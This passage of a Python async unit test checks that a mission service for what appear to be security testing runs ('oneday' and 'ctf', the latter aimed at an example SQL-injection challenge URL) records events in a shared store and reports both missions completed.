        service2 = MissionService(event_store=store, coordinator=mock2)
        report2 = await service2.execute(
            mission_type="ctf",
            target_uri="https://ctf.example.com/chall/sqli",
            topology="ooda",
        )

        events_after_m2 = await store.count()
        assert events_after_m2 > events_after_m1, (
            "Second mission should add more events"
        )

        # Both reports valid
        assert report1.status == "completed"
        assert report2.status == "completed"
        assert report1.mission_type == "oneday"
        assert report2.mission_type == "ctf"

        # Total events in store is sum of both missions
        all_events = await store.load_all()
        assert len(all_events) == events_after_m2

        # Can filter by context
        recon_events = await store.load_by_context("recon")
        assert len(recon_events) >= 1  # From mission 1

        ctf_events = await store.load_by_context("ctf")
        assert len(ctf_events) >= 1  # From mission 2
